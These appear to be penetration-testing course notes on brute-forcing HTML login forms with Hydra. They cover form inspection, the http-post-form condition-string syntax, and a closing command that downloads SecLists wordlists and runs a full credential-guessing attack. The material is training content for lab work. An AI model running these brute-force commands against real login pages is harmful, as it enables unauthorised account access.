## A Basic Login Form Example

```html
<form action="/login" method="post"> 
	<label for="username">Username:</label> 
	<input type="text" id="username" name="username"><br><br> 
	<label for="password">Password:</label> 
	<input type="password" id="password" name="password"><br><br> 
	<input type="submit" value="Submit"> 
</form>
```

This form, when submitted, sends a POST request to the `/login` endpoint on the server, including the entered username and password as form data.

```http
POST /login HTTP/1.1 
Host: www.example.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 29 

username=john&password=secret123
```
## http-post-form

```shell
3kjS@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
```
### Understanding the Condition String

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```
### Manual Inspection

```html
<form method="POST"> <h2>Login</h2> 
	<label for="username">Username:</label> 
	<input type="text" id="username" name="username"> 
	<label for="password">Password:</label> 
	<input type="password" id="password" name="password"> 
	<input type="submit" value="Login"> 
</form>
```
### Browser Developer Tools
![](Pasted%20image%2020260612144606.png)
## Constructing the params String for Hydra

```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

```shell
# Download wordlists if needed 
3kjS@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt 3kjS@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt 
# Hydra command 
3kjS@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s PORT http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```
